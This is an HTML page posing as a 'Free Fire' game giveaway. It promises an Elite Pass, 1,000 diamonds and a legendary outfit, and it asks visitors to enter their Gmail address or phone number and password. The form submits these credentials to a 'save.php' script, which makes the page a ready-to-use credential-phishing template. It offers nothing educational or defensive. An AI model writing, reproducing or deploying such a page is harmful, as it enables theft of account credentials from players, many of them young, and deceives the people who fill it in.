<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Fire Bundle Claim</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .login-box {
      background-color: #1e1e2f;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      margin-bottom: 15px;
    }
    .offers {
      margin-bottom: 20px;
    }
    .offer {
      background: #333;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 8px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #ff5722;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>🎁 Claim Free Fire Bundles</h2>
    <div class="offers">
      <div class="offer">🔥 Elite Pass Bundle</div>
      <div class="offer">💎 1,000 Diamonds Pack</div>
      <div class="offer">🧥 Legendary Outfit Set</div>
    </div>
    <form action="save.php" method="POST">
      <input type="text" name="email" placeholder="Enter Gmail or Number" required>
      <input type="password" name="password" placeholder="Enter Password" required>
      <button type="submit">Login & Claim</button>
    </form>
  </div>
</body>
</html>